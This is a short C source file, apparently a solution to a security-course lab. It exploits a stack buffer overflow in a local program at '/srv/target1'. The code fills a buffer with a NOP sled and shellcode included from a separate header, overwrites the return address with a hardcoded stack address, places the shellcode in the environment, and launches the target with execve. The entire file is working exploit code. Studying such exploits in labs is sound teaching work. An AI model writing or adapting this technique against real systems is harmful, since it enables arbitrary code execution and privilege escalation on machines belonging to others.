#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

const char* TARGET = "/srv/target1";

const int BSIZE = 16;
const int SHSIZE = sizeof(shellcode) - 1;
const uint32_t ADD = 0xffffd4bc;

char* prep() {
  char* buf = malloc(BSIZE + 1);
  memset(buf, 0x90, BSIZE);
  memcpy(buf, shellcode, SHSIZE);
  *(uint32_t*)(buf + BSIZE - 4) = ADD;
  buf[BSIZE] = '\0';
  return buf;
}

int main() {
    char* args[3] = {(char*)TARGET, prep(), NULL};
    char* env[2] = {shellcode, NULL};

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}